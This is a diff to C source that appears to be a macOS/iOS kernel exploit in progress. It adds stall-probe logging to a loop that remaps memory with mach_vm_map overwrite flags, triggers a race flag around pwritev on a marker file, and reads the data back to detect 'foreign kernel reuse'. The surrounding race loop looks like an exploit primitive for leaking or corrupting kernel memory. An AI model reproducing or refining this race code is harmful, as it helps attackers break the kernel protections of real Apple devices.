@@ -972,12 +972,20 @@ static CFNumberRef RCNUM(int64_t v) {
                    tags nor rfill = foreign kernel reuse in the window */
                 uint64_t hw2 = 0, hf2 = 0, hp2 = 0, hown2 = 0, hit2 = 0;
                 int aimDumped = 0;
+                /* v12.3 stall pinpoint: the first two iterations log each
+                   syscall stage; a hang names its call on the receipt */
+                for (int it2p = 0; it2p < 2; it2p++)
+                    rc_log("[v12 stall-probe %d] ready", it2p);
                 for (uint32_t ho = 0; ho < rc_hotN + 1 && ho < 24; ho++) {
                     if (rc_hotN == 0 && warmN == 0) break;
                     uint64_t off = (ho < rc_hotN)
                         ? rc_hotOffs[ho] : rc_warm[warmN - 1];
+                    rc_log("[v12] window %u off=0x%llx start", ho,
+                           (unsigned long long)off);
                     uint32_t pg = (uint32_t)(off / vm_page_size);
                     for (int it2 = 0; it2 < 30; it2++) {
+                        if (ho == 0 && it2 < 2)
+                            rc_log("[v12 stall-probe %d] pre-map", it2);
                         mach_vm_address_t a = pcBig;
                         mach_vm_map(mach_task_self(), &a, 0x8000, 0,
                             VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObjBig, 0,
@@ -985,11 +993,15 @@ static CFNumberRef RCNUM(int64_t v) {
                         memset_pattern8((void *)pcBig, &m0, 0x8000);
                         pwrite(fdMark, zreset, sizeof(zreset), 0x3f00);
                         struct iovec iov12 = { (void *)(pcBig + 0x3f00), 0x4000 };
+                        if (ho == 0 && it2 < 2)
+                            rc_log("[v12 stall-probe %d] pre-write", it2);
                         rc_mapAddr = pcBig; rc_mapSize = 0x8000;
                         rc_mapObj = searchObj; rc_mapOff = (mach_vm_offset_t)off;
                         rc_raceOn = 1;
                         pwritev(fdMark, &iov12, 1, 0x3f00);
                         while (rc_raceOn == 1);
+                        if (ho == 0 && it2 < 2)
+                            rc_log("[v12 stall-probe %d] post-write", it2);
                         pread(fdMark, rbBuf, sizeof(rbBuf), 0x4000);
                         uint64_t got2 = 0; int32_t delta2 = 0;
                         rc_cls_t c12 = rc_cls(rbBuf, pg + 1, npages, &got2, &delta2);
